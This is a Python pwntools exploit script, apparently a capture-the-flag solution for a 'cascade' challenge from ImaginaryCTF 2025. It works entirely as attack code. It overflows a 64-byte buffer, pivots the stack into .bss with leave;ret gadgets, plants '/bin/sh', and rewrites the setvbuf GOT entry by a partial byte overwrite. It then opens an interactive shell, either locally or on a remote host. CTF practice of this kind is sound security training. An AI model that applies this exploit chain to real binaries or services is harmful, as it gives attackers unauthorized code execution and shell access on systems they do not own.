#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
set solib-search-path /home/kurlz/ctf/2025/imaginaryctf/cascade

continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
exe = "./vuln_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

read = 0x401162 # This has leave ret 
leave = 0x401179 #: leave ; ret ; (1 found)
pop_rbp = 0x4011ce #: pop rbp ; ret ; (1 found)
bss = 0x404050
setvbuf_leak = 0x04011A1
payload1 = flat(
    b"A" * 64,
    bss + 0x800,
    read,
    )

sl(payload1)

payload4 = flat(
    b"/bin/sh\00",
    b"F" * 56,
    bss + 0x20,
    read,
    setvbuf_leak,
    b"B" * 8
    )

# input("Send 4?")
# sleep(0.5)
sl(payload4)

payload2 = flat(
    0x404810, # overwriting stdin,
    b"A" * 0x10,
    0x404858, # payload 3 rbp
    leave, # payload 3 saved rip
    b"A" * 24, 
    elf.got.setvbuf + 0x40,
    read,
    b"E" * 0xf0,
    )
# input("Send 2?")
# sleep(0.5)
sl(payload2)

# input("Send 3?")

payload3 = b"\x6b\x87\xa5"
# sleep(0.5)
s(payload3)
io.interactive()

